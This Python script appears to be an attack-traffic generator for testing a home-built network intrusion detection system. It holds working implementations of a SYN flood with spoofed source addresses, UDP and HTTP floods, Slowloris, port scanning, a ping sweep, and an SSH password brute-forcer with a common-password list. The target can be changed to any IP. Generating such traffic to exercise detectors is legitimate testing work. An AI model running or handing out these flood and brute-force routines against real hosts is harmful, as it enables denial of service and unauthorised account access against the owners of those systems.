"""
=============================================================
 NIDS - Attack Simulator
 Generates REAL suspicious traffic to test your NIDS
 Run this on the SAME machine or another machine on your network

 Usage:
   python nids_attack_sim.py                  (interactive menu)
   python nids_attack_sim.py --ddos           (DDoS simulation)
   python nids_attack_sim.py --portscan       (Port scan)
   python nids_attack_sim.py --bruteforce     (Brute force SSH)
   python nids_attack_sim.py --all            (Run all attacks)

 ⚠️  FOR EDUCATIONAL/TESTING PURPOSES ONLY
 ⚠️  Only use on YOUR OWN network
=============================================================
"""

import os, sys, time, random, threading, socket, struct
import argparse
from datetime import datetime

# Target — auto-detect this machine's real LAN IP
# This ensures traffic goes through eth0/wlan0 (not loopback)
# so Scapy can capture it
import subprocess as _sp

def _get_local_ip():
    try:
        s = __import__('socket').socket(__import__('socket').AF_INET, __import__('socket').SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return '127.0.0.1'

TARGET_IP   = _get_local_ip()
TARGET_HOST = TARGET_IP
print(f'[*] Attack simulator targeting: {TARGET_IP}')

# ─────────────────────────────────────────────
# COLORS FOR TERMINAL
# ─────────────────────────────────────────────
R  = '\033[91m'   # red
G  = '\033[92m'   # green
Y  = '\033[93m'   # yellow
B  = '\033[94m'   # blue
C  = '\033[96m'   # cyan
W  = '\033[97m'   # white
M  = '\033[95m'   # magenta
RS = '\033[0m'    # reset

def log(color, tag, msg):
    ts = datetime.now().strftime('%H:%M:%S.%f')[:12]
    print(f'{color}[{ts}] [{tag}]{RS} {msg}')

def banner():
    print(f'''
{R}╔══════════════════════════════════════════════════════╗
║          NIDS ATTACK SIMULATOR                       ║
║          FOR TESTING YOUR NIDS SYSTEM                ║
║          Educational Use Only - Own Network          ║
╚══════════════════════════════════════════════════════╝{RS}
''')


# ─────────────────────────────────────────────
# 1. PORT SCANNER
# Scans ports rapidly — classic PortScan signature
# Your NIDS should detect: many RST flags, small packets
# ─────────────────────────────────────────────

def attack_portscan(target=TARGET_IP, port_range=(1, 1024), delay=0.01):
    log(Y, 'PORTSCAN', f'Starting port scan on {target} ports {port_range[0]}-{port_range[1]}')
    log(Y, 'PORTSCAN', 'Your NIDS should detect: RST flags, many small flows')

    open_ports  = []
    closed      = 0
    total       = port_range[1] - port_range[0]

    for port in range(port_range[0], port_range[1] + 1):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.05)
            result = sock.connect_ex((target, port))
            if result == 0:
                open_ports.append(port)
                log(G, 'PORTSCAN', f'Port {port} OPEN ✓')
            else:
                closed += 1
            sock.close()
        except Exception:
            pass

        # Show progress every 100 ports
        done = port - port_range[0]
        if done % 100 == 0 and done > 0:
            pct = done / total * 100
            log(Y, 'PORTSCAN', f'Progress: {done}/{total} ports ({pct:.0f}%)')

        time.sleep(delay)

    log(Y, 'PORTSCAN', f'Scan complete — Open: {open_ports} | Closed: {closed}')
    return open_ports


# ─────────────────────────────────────────────
# 2. SYN FLOOD (DDoS simulation)
# Sends many TCP SYN packets rapidly
# Your NIDS should detect: high SYN count, no ACK responses
# Uses raw sockets — needs sudo
# ─────────────────────────────────────────────

def attack_synflood(target=TARGET_IP, port=80, duration=15, rate=500):
    log(R, 'SYN FLOOD', f'Starting SYN flood → {target}:{port} for {duration}s at {rate} pps')
    log(R, 'SYN FLOOD', 'Your NIDS should detect: DDoS / high packet rate')

    sent    = 0
    start   = time.time()
    end_t   = start + duration

    while time.time() < end_t:
        try:
            # Use multiple threads for higher rate
            threads = []
            for _ in range(10):
                t = threading.Thread(
                    target=_send_syn_burst,
                    args=(target, port, 50)
                )
                t.daemon = True
                threads.append(t)
                t.start()
            for t in threads:
                t.join(timeout=0.1)
            sent += 500

            elapsed = time.time() - start
            if int(elapsed) % 3 == 0 and elapsed > 0:
                log(R, 'SYN FLOOD', f'Sent ~{sent:,} packets | {elapsed:.0f}s elapsed')

            time.sleep(0.1)

        except KeyboardInterrupt:
            break
        except Exception as e:
            # Fall back to TCP connect flood if raw sockets fail
            _tcp_connect_flood(target, port, 20)
            sent += 20

    log(R, 'SYN FLOOD', f'Attack complete — Total packets sent: ~{sent:,}')


def _send_syn_burst(target, port, count):
    """Send TCP SYN packets using raw socket."""
    for _ in range(count):
        try:
            # Try raw socket first (needs sudo)
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            packet = _build_syn_packet(target, port)
            s.sendto(packet, (target, port))
            s.close()
        except (PermissionError, OSError):
            # Fallback: TCP connect (still triggers detection)
            _tcp_connect_flood(target, port, 1)
        except Exception:
            pass


def _tcp_connect_flood(target, port, count):
    """Rapid TCP connections — detectable without raw sockets."""
    for _ in range(count):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.05)
            s.connect_ex((target, port))
            s.close()
        except Exception:
            pass


def _build_syn_packet(dest_ip, dest_port):
    """Build a raw TCP SYN packet."""
    # Random source IP to simulate distributed attack
    src_ip = f'{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}'

    # IP header
    ip_ihl     = 5
    ip_ver     = 4
    ip_tos     = 0
    ip_tot_len = 0
    ip_id      = random.randint(1, 65535)
    ip_frag_off= 0
    ip_ttl     = 64
    ip_proto   = socket.IPPROTO_TCP
    ip_check   = 0
    ip_saddr   = socket.inet_aton(src_ip)
    ip_daddr   = socket.inet_aton(dest_ip)
    ip_ihl_ver = (ip_ver << 4) + ip_ihl
    ip_header  = struct.pack('!BBHHHBBH4s4s',
        ip_ihl_ver, ip_tos, ip_tot_len, ip_id,
        ip_frag_off, ip_ttl, ip_proto, ip_check,
        ip_saddr, ip_daddr
    )

    # TCP header
    tcp_sport  = random.randint(1024, 65535)
    tcp_dport  = dest_port
    tcp_seq    = random.randint(0, 4294967295)
    tcp_ack    = 0
    tcp_doff   = 5
    tcp_flags  = 0x002   # SYN flag
    tcp_window = 65535
    tcp_check  = 0
    tcp_urg    = 0
    tcp_offset = (tcp_doff << 4) | 0
    tcp_header = struct.pack('!HHLLBBHHH',
        tcp_sport, tcp_dport, tcp_seq, tcp_ack,
        tcp_offset, tcp_flags, tcp_window, tcp_check, tcp_urg
    )

    return ip_header + tcp_header


# ─────────────────────────────────────────────
# 3. BRUTE FORCE SSH SIMULATOR
# Rapid connection attempts to SSH port
# Your NIDS should detect: many connections to port 22,
#   consistent packet sizes, high frequency
# ─────────────────────────────────────────────

def attack_bruteforce_ssh(target=TARGET_IP, port=22, attempts=100, delay=0.05):
    log(M, 'BRUTEFORCE', f'Starting SSH brute force → {target}:{port}')
    log(M, 'BRUTEFORCE', f'Sending {attempts} login attempts')
    log(M, 'BRUTEFORCE', 'Your NIDS should detect: BruteForce / rapid SSH connections')

    # Common passwords to try (fake — just for traffic generation)
    passwords = [
        'password', '123456', 'admin', 'root', 'letmein',
        'qwerty', 'abc123', 'monkey', 'master', 'dragon',
        'pass', 'test', 'login', 'welcome', 'hello',
        'admin123', 'password1', 'iloveyou', 'sunshine', 'princess',
    ]
    usernames = ['root', 'admin', 'user', 'ubuntu', 'pi', 'guest']

    success = 0
    failed  = 0

    for i in range(attempts):
        user = random.choice(usernames)
        pwd  = random.choice(passwords)

        try:
            # Try paramiko for real SSH attempt if available
            try:
                import paramiko
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(target, port=port, username=user,
                               password=pwd, timeout=1, banner_timeout=1,
                               auth_timeout=1)
                log(G, 'BRUTEFORCE', f'[!] SUCCESS: {user}:{pwd}')
                client.close()
                success += 1
            except ImportError:
                # paramiko not installed — use raw TCP to port 22
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.5)
                s.connect((target, port))
                # Send fake SSH handshake data
                s.send(b'SSH-2.0-OpenSSH_7.4\r\n')
                time.sleep(0.1)
                s.close()
                failed += 1

        except (ConnectionRefusedError, socket.timeout, OSError):
            failed += 1
        except Exception:
            failed += 1

        if (i+1) % 10 == 0:
            log(M, 'BRUTEFORCE', f'Attempt {i+1}/{attempts} | Success:{success} Failed:{failed}')

        time.sleep(delay)

    log(M, 'BRUTEFORCE', f'Brute force complete — {attempts} attempts | {success} success | {failed} failed')


# ─────────────────────────────────────────────
# 4. HTTP FLOOD (DoS Hulk style)
# Floods a web server with HTTP requests
# Your NIDS should detect: DoS Hulk / high HTTP rate
# ─────────────────────────────────────────────

def attack_http_flood(target=TARGET_HOST, port=80, duration=15, threads=20):
    log(B, 'HTTP FLOOD', f'Starting HTTP flood → {target}:{port} for {duration}s')
    log(B, 'HTTP FLOOD', f'Using {threads} concurrent threads')
    log(B, 'HTTP FLOOD', 'Your NIDS should detect: DoS Hulk / high traffic volume')

    sent    = [0]
    stop    = [False]
    start   = time.time()

    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        'Mozilla/5.0 (Linux; Android 10)',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
        'curl/7.68.0',
        'python-requests/2.25.1',
    ]

    paths = ['/', '/index.html', '/login', '/api/data',
             '/search?q=' + 'A'*100, '/admin', '/wp-login.php']

    def flood_worker():
        while not stop[0]:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((target, port))

                path = random.choice(paths)
                ua   = random.choice(user_agents)
                req  = (
                    f'GET {path} HTTP/1.1\r\n'
                    f'Host: {target}\r\n'
                    f'User-Agent: {ua}\r\n'
                    f'Accept: */*\r\n'
                    f'Connection: keep-alive\r\n\r\n'
                ).encode()

                s.send(req)
                s.close()
                sent[0] += 1
            except Exception:
                pass

    # Start flood threads
    worker_threads = []
    for _ in range(threads):
        t = threading.Thread(target=flood_worker, daemon=True)
        t.start()
        worker_threads.append(t)

    # Monitor and show progress
    while time.time() - start < duration:
        time.sleep(3)
        elapsed = time.time() - start
        rps = sent[0] / max(elapsed, 1)
        log(B, 'HTTP FLOOD', f'Sent: {sent[0]:,} requests | {rps:.0f} req/s | {elapsed:.0f}s/{duration}s')

    stop[0] = True
    log(B, 'HTTP FLOOD', f'Attack complete — Total: {sent[0]:,} requests')


# ─────────────────────────────────────────────
# 5. UDP FLOOD
# Floods target with UDP packets
# Your NIDS should detect: high UDP packet rate
# ─────────────────────────────────────────────

def attack_udp_flood(target=TARGET_IP, port=53, duration=10, size=512):
    log(C, 'UDP FLOOD', f'Starting UDP flood → {target}:{port} for {duration}s')
    log(C, 'UDP FLOOD', 'Your NIDS should detect: high UDP volume / DDoS')

    sent  = 0
    start = time.time()
    data  = random.randbytes(size)

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.time() - start < duration:
            try:
                s.sendto(data, (target, port))
                sent += 1
                if sent % 1000 == 0:
                    elapsed = time.time() - start
                    log(C, 'UDP FLOOD', f'Sent {sent:,} packets | {sent/elapsed:.0f} pps')
            except Exception:
                break
        s.close()
    except Exception as e:
        log(R, 'UDP FLOOD', f'Error: {e}')

    log(C, 'UDP FLOOD', f'Attack complete — Sent {sent:,} UDP packets')


# ─────────────────────────────────────────────
# 6. SLOW LORIS (Infiltration style)
# Keeps many connections open slowly
# Your NIDS should detect: many long-lived connections
# ─────────────────────────────────────────────

def attack_slowloris(target=TARGET_HOST, port=80, connections=50, duration=20):
    log(W, 'SLOWLORIS', f'Starting Slowloris → {target}:{port}')
    log(W, 'SLOWLORIS', f'Opening {connections} slow connections for {duration}s')
    log(W, 'SLOWLORIS', 'Your NIDS should detect: Infiltration / long flows')

    sockets = []
    start   = time.time()

    # Open many connections
    for i in range(connections):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((target, port))
            s.send(f'GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: Mozilla/5.0\r\n'.encode())
            sockets.append(s)
        except Exception:
            pass

    log(W, 'SLOWLORIS', f'Opened {len(sockets)} connections — now keeping them alive slowly...')

    # Keep connections alive with slow partial headers
    while time.time() - start < duration:
        for s in list(sockets):
            try:
                s.send(b'X-Custom-Header: ' + random.randbytes(5) + b'\r\n')
            except Exception:
                sockets.remove(s)

        alive = len(sockets)
        elapsed = time.time() - start
        log(W, 'SLOWLORIS', f'Alive connections: {alive} | {elapsed:.0f}s/{duration}s')
        time.sleep(3)

    # Close all
    for s in sockets:
        try: s.close()
        except: pass

    log(W, 'SLOWLORIS', 'Slowloris complete')


# ─────────────────────────────────────────────
# 7. PING SWEEP (Network Reconnaissance)
# Pings many IPs in subnet
# Your NIDS should detect: reconnaissance / ICMP sweep
# ─────────────────────────────────────────────

def attack_ping_sweep(subnet='192.168.100', count=50):
    log(Y, 'PING SWEEP', f'Sweeping subnet {subnet}.1-{count}')
    log(Y, 'PING SWEEP', 'Your NIDS should detect: ICMP sweep / reconnaissance')

    alive = []
    for i in range(1, count+1):
        ip = f'{subnet}.{i}'
        response = os.system(f'ping -c 1 -W 1 {ip} > /dev/null 2>&1')
        if response == 0:
            alive.append(ip)
            log(G, 'PING SWEEP', f'{ip} is UP ✓')
        else:
            print(f'  {ip} ... down', end='\r')

    log(Y, 'PING SWEEP', f'Sweep complete — Alive hosts: {alive}')
    return alive


# ─────────────────────────────────────────────
# INTERACTIVE MENU
# ─────────────────────────────────────────────

def interactive_menu():
    banner()

    # Get target
    print(f'{C}Target Configuration:{RS}')
    target_input = input(f'  Enter target IP [{TARGET_IP}]: ').strip()
    target = target_input if target_input else TARGET_IP

    print(f'\n{Y}Available Attack Simulations:{RS}')
    print(f'  {R}1{RS}. SYN Flood / DDoS     — High packet rate, many SYNs')
    print(f'  {M}2{RS}. Port Scan             — Rapid port scanning (RST flags)')
    print(f'  {M}3{RS}. SSH Brute Force       — Rapid SSH login attempts')
    print(f'  {B}4{RS}. HTTP Flood (DoS Hulk) — Flood web server with requests')
    print(f'  {C}5{RS}. UDP Flood             — High UDP packet rate')
    print(f'  {W}6{RS}. Slowloris             — Keep many connections open')
    print(f'  {Y}7{RS}. Ping Sweep            — ICMP reconnaissance')
    print(f'  {G}8{RS}. Run ALL attacks        — Full attack simulation')
    print(f'  {R}0{RS}. Exit')

    print(f'\n{Y}Tip: Keep nids_dashboard.py running in another terminal to see detection!{RS}\n')

    choice = input(f'{C}Select attack [0-8]: {RS}').strip()

    print()

    if choice == '1':
        dur = int(input('  Duration in seconds [15]: ') or '15')
        attack_synflood(target=target, port=80, duration=dur)

    elif choice == '2':
        end_port = int(input('  Scan up to port [1024]: ') or '1024')
        attack_portscan(target=target, port_range=(1, end_port))

    elif choice == '3':
        attempts = int(input('  Number of attempts [100]: ') or '100')
        attack_bruteforce_ssh(target=target, attempts=attempts)

    elif choice == '4':
        dur = int(input('  Duration in seconds [15]: ') or '15')
        port = int(input('  Target port [80]: ') or '80')
        attack_http_flood(target=target, port=port, duration=dur)

    elif choice == '5':
        dur = int(input('  Duration in seconds [10]: ') or '10')
        attack_udp_flood(target=target, duration=dur)

    elif choice == '6':
        dur = int(input('  Duration in seconds [20]: ') or '20')
        attack_slowloris(target=target, duration=dur)

    elif choice == '7':
        subnet = input(f'  Subnet prefix [{".".join(target.split(".")[:3])}]: ').strip()
        if not subnet:
            subnet = '.'.join(target.split('.')[:3])
        attack_ping_sweep(subnet=subnet)

    elif choice == '8':
        run_all_attacks(target)

    elif choice == '0':
        print('Exiting...')
        sys.exit(0)

    else:
        print(f'{R}Invalid choice{RS}')

    print(f'\n{G}Check your NIDS dashboard for detections!{RS}')
    print(f'{C}http://localhost:5000{RS}\n')


def run_all_attacks(target=TARGET_IP):
    """Run all attacks sequentially with pauses between them."""
    log(R, 'ALL', f'Running full attack simulation against {target}')
    log(R, 'ALL', 'Watch your NIDS dashboard for detections!')
    print()

    attacks = [
        ('Port Scan',      lambda: attack_portscan(target, (1, 500), 0.005)),
        ('SYN Flood',      lambda: attack_synflood(target, 80, 10)),
        ('SSH BruteForce', lambda: attack_bruteforce_ssh(target, 22, 50, 0.02)),
        ('HTTP Flood',     lambda: attack_http_flood(target, 5000, 10)),
        ('UDP Flood',      lambda: attack_udp_flood(target, 53, 8)),
        ('Slowloris',      lambda: attack_slowloris(target, 5000, 10)),
        ('Ping Sweep',     lambda: attack_ping_sweep('.'.join(target.split('.')[:3]), 20)),
    ]

    for name, attack_fn in attacks:
        print(f'\n{"─"*55}')
        log(R, 'ALL', f'Starting: {name}')
        print(f'{"─"*55}')
        try:
            attack_fn()
        except Exception as e:
            log(R, 'ALL', f'{name} error: {e}')
        log(G, 'ALL', f'{name} complete — pausing 3 seconds...')
        time.sleep(3)

    log(G, 'ALL', 'All attacks complete! Check your NIDS dashboard.')


# ─────────────────────────────────────────────
# ENTRY POINT
# ─────────────────────────────────────────────

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='NIDS Attack Simulator')
    parser.add_argument('--target',     default=TARGET_IP,    help='Target IP address')
    parser.add_argument('--ddos',       action='store_true',  help='SYN Flood / DDoS')
    parser.add_argument('--portscan',   action='store_true',  help='Port scan')
    parser.add_argument('--bruteforce', action='store_true',  help='SSH brute force')
    parser.add_argument('--httpflood',  action='store_true',  help='HTTP flood')
    parser.add_argument('--udpflood',   action='store_true',  help='UDP flood')
    parser.add_argument('--slowloris',  action='store_true',  help='Slowloris attack')
    parser.add_argument('--pingsweep',  action='store_true',  help='Ping sweep')
    parser.add_argument('--all',        action='store_true',  help='Run all attacks')
    parser.add_argument('--duration',   type=int, default=15, help='Attack duration seconds')
    args = parser.parse_args()

    banner()

    if args.all:
        run_all_attacks(args.target)
    elif args.ddos:
        attack_synflood(args.target, duration=args.duration)
    elif args.portscan:
        attack_portscan(args.target)
    elif args.bruteforce:
        attack_bruteforce_ssh(args.target)
    elif args.httpflood:
        attack_http_flood(args.target, duration=args.duration)
    elif args.udpflood:
        attack_udp_flood(args.target, duration=args.duration)
    elif args.slowloris:
        attack_slowloris(args.target, duration=args.duration)
    elif args.pingsweep:
        attack_ping_sweep('.'.join(args.target.split('.')[:3]))
    else:
        # No flags — show interactive menu
        while True:
            interactive_menu()
            again = input(f'\n{C}Run another attack? [y/n]: {RS}').strip().lower()
            if again != 'y':
                break
